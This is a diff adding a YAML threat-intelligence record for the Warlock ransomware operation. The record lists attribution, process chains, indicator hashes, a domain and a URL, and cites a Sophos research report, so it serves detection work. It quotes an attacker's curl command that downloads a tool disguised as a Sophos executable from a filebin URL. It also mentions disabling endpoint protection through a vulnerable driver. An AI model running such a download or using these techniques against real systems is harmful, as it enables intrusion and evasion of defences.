@@ -1,0 +1,49 @@
+description: "Warlock Group (GOLD SALEM) deployed Warlock ransomware in March\u202F\
+  2025, using SharePoint ToolShell exploits and a Tor-based leak site to publish victim\
+  \ data."
+attribution: "China\u2011based threat actor (moderate confidence), also referred to\
+  \ as Storm\u20112603 by Microsoft"
+malware_families:
+- Warlock ransomware
+TTPs:
+  processes:
+  - w3wp.exe
+  - cmd.exe
+  - Sophos-UI.exe
+  commandline:
+  - curl -L -o c:\\\\users\\\\public\\\\Sophos\\\\Sophos-UI.exe hxxps[:]//filebin[.]net/j7jqfnh8tn4alzsr/wsocks.exe.txt
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: Sophos-UI.exe
+    destination: hxxps://filebin.net/j7jqfnh8tn4alzsr/wsocks.exe.txt
+    port: 443
+  file_activity:
+  - c:\\\\users\\\\public\\\\Sophos\\\\Sophos-UI.exe
+  - wsocks.exe (downloaded via web shell)
+  persistence:
+  - Group Policy Objects used to deploy Warlock payload
+  - BYOVD technique using vulnerable Baidu Antivirus driver googleApiUtil64.sys to
+    terminate EDR agent
+  process_relations:
+  - w3wp.exe -> cmd.exe
+IOCs:
+  hashes:
+  - bfbeac96a385b1e5643ec0752b132506
+  - de25be0afd53a1d274eec02e5303622fc8e7dbd5
+  - 996c7bcec3c12c3462220fc2c19d61ccc039005ef5e7c8fabc0b34631a31abb1
+  - b3a099ecca79503a0e4a154bd85d3e6b
+  - 6d0cc6349a951f0b52394ad3436d1656ec5fba6a
+  - a204a48496b54bcb7ae171ad435997b92eb746b5718f166b3515736ee34a65b4
+  ips: []
+  domains:
+  - filebin.net
+  urls:
+  - hxxps://filebin.net/j7jqfnh8tn4alzsr/wsocks.exe.txt
+authors:
+- Counter Threat Unit (CTU) researchers
+reference: https://news.sophos.com/en-us/2025/09/17/gold-salems-warlock-operation-joins-busy-ransomware-landscape
+date_of_publication: September 17, 2025
+file_creation_date: October 01, 2025
